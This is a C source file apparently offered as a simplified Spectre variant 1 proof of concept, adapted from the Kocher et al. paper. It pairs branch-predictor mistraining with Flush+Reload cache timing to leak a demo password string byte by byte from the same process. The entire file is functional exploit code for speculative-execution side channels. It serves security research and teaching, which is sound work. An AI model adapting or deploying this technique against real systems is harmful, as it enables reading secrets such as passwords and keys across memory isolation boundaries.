/*
    This code is a stripped down, simplified and
    a bit modified version of:

    Kocher, Paul, et al. "Spectre attacks: Exploiting
    speculative execution." 2019 IEEE Symposium on
    Security and Privacy (SP). IEEE, 2019.
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define CACHE_HIT_THRESHOLD (100)

char sideChannelArray[256 * 4096];
char publicArraySize = 16;
char publicArray[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
char *secret = "Password: P@55w0|2d1337&*)(#@!~`";
char temp = 0;

void victim_function(size_t x) {
    // We try to cache sideChannelArray at index publicArray[x] * 4096
    // while the CPU is retrieving publicArraySize from
    // main memory.
    if (x < publicArraySize) {
        temp = sideChannelArray[publicArray[x] * 4096];
    }
}

int flushOnly(char *adrs)
{
    asm __volatile__ ("clflush (%0)"::"r"(adrs):);
}

/*
    Function flushReload taken from FLUSH+REALOAD paper:

    Yarom, Y., & Falkner, K. (2014). FLUSH+ RELOAD:
    a high resolution, low noise, L3 cache side-channel attack.
    In 23rd {USENIX} Security Symposium ({USENIX} Security 14) (pp. 719-732).
*/
int flushReload(char *adrs)
{
    volatile unsigned long time;

    asm __volatile__ (
        "mfence             \n"
        "lfence             \n"
        "rdtsc              \n"
        "lfence             \n"
        "movl %%eax, %%esi  \n"
        "movl (%1), %%eax   \n"
        "lfence             \n"
        "rdtsc              \n"
        "subl %%esi, %%eax  \n"
        "clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        :  "%esi", "%edx");

    return time < CACHE_HIT_THRESHOLD;
}

char readMemoryByte(size_t secretAddr) {
    int results[256] = { 0 };
    int tries, i, j, k, temp;
    size_t training_x, x;

    for (tries = 999; tries > 0; tries--)
    {
        for (i = 0; i < 256; i++)
            flushOnly(&sideChannelArray[i * 4096]);
        training_x = tries % publicArraySize;
        for (j = 29; j >= 0; j--)
        {
            flushOnly(&publicArraySize);
            // For delay
            for (temp = 100; temp >= 0; temp--) {}
            // Very important step:
            // TODO: FIGURE OUT WHICH TYPE OF PREDICTION IS THIS PART USED FOR?
            // Plays with bits to prevent some branch prediction algorithm,
            // every 6th call to victim function inputs x = secretAddr.
            x = ((j % 6)-1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (secretAddr ^ training_x));
            victim_function(x);
        }
        // Flush+Reload each element to extract cached value
        for (i = 0; i < 256; i++)
        {
            // Very important step:
            // temp here is used to prevent stride prediction
            temp = ((i * 167) + 13) & 255;
            if (flushReload(&sideChannelArray[temp*4096]))
                results[temp]++;
        }
    }

    // Find the first largest result that
    // is a printable ASCII character
    for (k = 0; k < 256; k++)
    {
        // Get largest value
        temp = 0;
        j = results[0];
        for (i = 1; i < 256; i++)
        {
            if (results[i] > j)
            {
                j = results[i];
                temp = i;
            }
        }
        // Check for common letters, numbers and symbols
        // else consider as garbage and repeat
        if (32 <= temp && temp <= 126)
            return temp;
        results[temp] = 0;
    }
    return 0;
}

int main(int argc, const char * * argv) {
    size_t secretAddr = (size_t)(secret - (char *)publicArray);
    int i;
    char value;

    // Important:
    // initialize sideChannelArray to avoid copy-on-write optimization
    for (i = 0; i < sizeof(sideChannelArray); i++)
        sideChannelArray[i] = 1;

    printf("Extracting secret:\n", strlen(secret));
    for (i = 0; i < strlen(secret); i++)
    {
        value = readMemoryByte(secretAddr++);
        if (value == 0)
            printf("Couldn't read\n");
        else
            printf("%c\n", value);
    }
    return (0);
}

